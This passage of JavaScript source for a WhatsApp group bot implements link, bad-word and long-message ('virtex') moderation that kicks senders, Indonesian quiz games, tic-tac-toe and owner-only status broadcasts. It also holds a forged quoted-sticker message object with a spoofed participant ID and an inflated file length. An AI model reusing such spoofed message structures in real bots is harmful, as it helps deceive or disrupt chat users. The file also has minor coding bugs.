			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return XeonStickBotAdmin()
          await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (BadXeon.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin kirim link telegram, admin mah bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin kirim link tiktok, admin mah bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin sudah kirim link twitter, admin mah bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

XeonBotInc.family100 = XeonBotInc.family100 ? XeonBotInc.family100 : {}
if(from in XeonBotInc.family100){
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let users = global.db.users[m.sender]
let room = XeonBotInc.family100[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
  
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) return replygcxeon('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
users.money += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()
  
XeonBotInc.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted: m}).then(msg => {
 XeonBotInc.family100[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete XeonBotInc.family100[id] 
//if (isWin || isSurrender) clearTimeout(200000)
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else replygcxeon('*Jawaban Salah!*')
}

XeonBotInc.tebakkata = XeonBotInc.tebakkata ? XeonBotInc.tebakkata : {}  
if (from in XeonBotInc.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(XeonBotInc.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.tebakkata[id][2])
 delete XeonBotInc.tebakkata[id]
} else replygcxeon('*Jawaban Salah!*')
}

XeonBotInc.tebakgambar = XeonBotInc.tebakgambar ? XeonBotInc.tebakgambar : {} 
if(from in XeonBotInc.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(XeonBotInc.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.tebakgambar[id][3])
 delete XeonBotInc.tebakgambar[id]
} else replygcxeon('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replygcxeon('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await XeonBotInc.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else replygcxeon('*Jawaban Salah!*')
        }

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replygcxeon('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await XeonBotInc.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else replygcxeon('*Jawaban Salah!*')
        }

 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replygcxeon('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await XeonBotInc.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else replygcxeon('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replygcxeon('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await XeonBotInc.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else replygcxeon('*Jawaban Salah!*')
        }
        
//=========================================\\
XeonBotInc.tekateki = XeonBotInc.tekateki ? XeonBotInc.tekateki : {}  
if(from in XeonBotInc.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(XeonBotInc.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += XeonBotInc.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${XeonBotInc.tekateki[id][2]} Money 💸`
 replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.tekateki[id][3])
 delete XeonBotInc.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replygcxeon(`*Dikit Lagi!*`)
}
//=========================================\\

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replygcxeon('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await XeonBotInc.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else replygcxeon('*Jawaban Salah!*')
        }
//=========================================\\
        XeonBotInc.siapaaku = XeonBotInc.siapaaku ? XeonBotInc.siapaaku : {}
if(from in XeonBotInc.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(XeonBotInc.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += XeonBotInc.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${XeonBotInc.siapaaku[id][2]} Money 💸`
   replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.siapaaku[id][3])
 delete XeonBotInc.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replygcxeon(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        XeonBotInc.susunkata = XeonBotInc.susunkata ? XeonBotInc.susunkata : {}  
if(from in XeonBotInc.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(XeonBotInc.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += XeonBotInc.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${XeonBotInc.susunkata[id][2]} Money 💸`
replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.susunkata[id][3])
 delete XeonBotInc.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replygcxeon(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else replygcxeon('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else replygcxeon('*Jawaban Salah!*')
}

//=========================================//
XeonBotInc.tebaklirik = XeonBotInc.tebaklirik ? XeonBotInc.tebaklirik : {}  
if(from in XeonBotInc.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(XeonBotInc.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += XeonBotInc.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${XeonBotInc.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replygcxeon(`${teks}`)
 clearTimeout(XeonBotInc.tebaklirik[id][3])
 delete XeonBotInc.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replygcxeon(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else replygcxeon('*Jawaban Salah!*')
}

//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin kirim link,\n Admin mah bebas cuy 🗿☕`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
XeonBotInc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: XeonBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XeonBotInc.ev.emit('messages.upsert', msg)
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

switch (command) {
case 'statustext': 
            case 'upswtext': {
               Xeonstickwait()
               if (!XeonTheCreator) return XeonStickOwner()
               if (!q) return replygcxeon('Text?')
               await XeonBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FFC0CB', font: 3, statusJidList: Object.keys(global.db.users) })
               reply(`Successfully uploaded, please check the status`)
            }
            break
                        case 'statusvideo':
            case 'upswvideo': {
               if (!XeonTheCreator) return XeonStickOwner()
               await Xeonstickwait()
               if (/video/.test(mime)) {
                  var XeonSwVid = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: XeonSwVid
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygcxeon(`Successfully uploaded, please check the status`)
               } else {
                  replygcxeon('Reply to video')
               }
            }
            break
            case 'statusimage':
            case 'upswimage': {
               if (!XeonTheCreator) return XeonStickOwner()
               await Xeonstickwait()
               if (/image/.test(mime)) {
                  var XeonSwImg = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: XeonSwImg
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygcxeon(`Successfully uploaded, please check the status`)
               } else {
                  replygcxeon('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!XeonTheCreator) return XeonStickOwner()
               await Xeonstickwait()
               if (/audio/.test(mime)) {
                  var XeonSwAud = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                  await XeonBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: XeonSwAud
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FFC0CB',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygcxeon(`Successfully uploaded, please check the status`)
               } else {
                  replygcxeon('Reply to audio!')
               }
            }
            break
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replygcxeon(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await XeonBotInc.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await XeonBotInc.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replygcxeon('Waiting For Partner' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            XeonBotInc.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replygcxeon(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replygcxeon('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcxeon(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replygcxeon(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replygcxeon(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcxeon(`Orang yang Anda tantang sedang bermain sesuai dengan orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Silahkan ketik accept untuk menerima atau ketik reject untuk menolak`
            this.suit[id] = {
            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_suit waktu habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	case 'public': {
if (!XeonTheCreator) return XeonStickOwner()
XeonBotInc.public = true
replygcxeon('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!XeonTheCreator) return XeonStickOwner()
XeonBotInc.public = false
replygcxeon('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
  if (!quoted) return replygcxeon(`Where is the picture?`)
let { TelegraPh } = require('./lib/uploader')
if (text.includes('|')) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
m.reply(mess.wait)
mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break


case 'jadibot': {
  if (!XeonTheCreator) return XeonStickOwner()
rentfromxeon(XeonBotInc, m, from)
}
break
case 'listjadibot': 
try {
